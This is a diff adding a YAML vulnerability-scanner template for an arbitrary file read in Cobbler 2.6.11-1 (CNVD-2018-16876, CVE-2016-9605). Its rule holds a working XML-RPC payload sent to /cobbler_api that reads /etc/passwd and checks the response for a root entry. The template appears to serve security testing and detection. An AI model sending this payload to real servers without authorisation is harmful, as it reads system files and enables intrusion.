@@ -1,0 +1,24 @@
+id: CNVD-2018-16876
+
+info:
+  name: Cobbler任意文件读取漏洞
+  author: rain
+  severity: medium
+  description: |
+    Cobbler是一款网络安装服务器套件，它能够快速建立Linux网络安装环境。
+    Cobbler 2.6.11-1版本中存在任意文件读取漏洞。攻击者可利用该漏洞读取任意文件。
+  reference:
+    - https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-9605
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cobbler_api
+      headers:
+        Content-Type: text/xml
+        Accept-Encoding: gzip
+    body: |
+      <?xml version='1.0'?><methodCall><methodName>generate_script</methodName><params><param><value><string>windows10</string></value></param><param><value><string></string></value></param><param><value><string>/etc/passwd</string></value></param></params></methodCall>
+    expression: response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
+expression: r0()
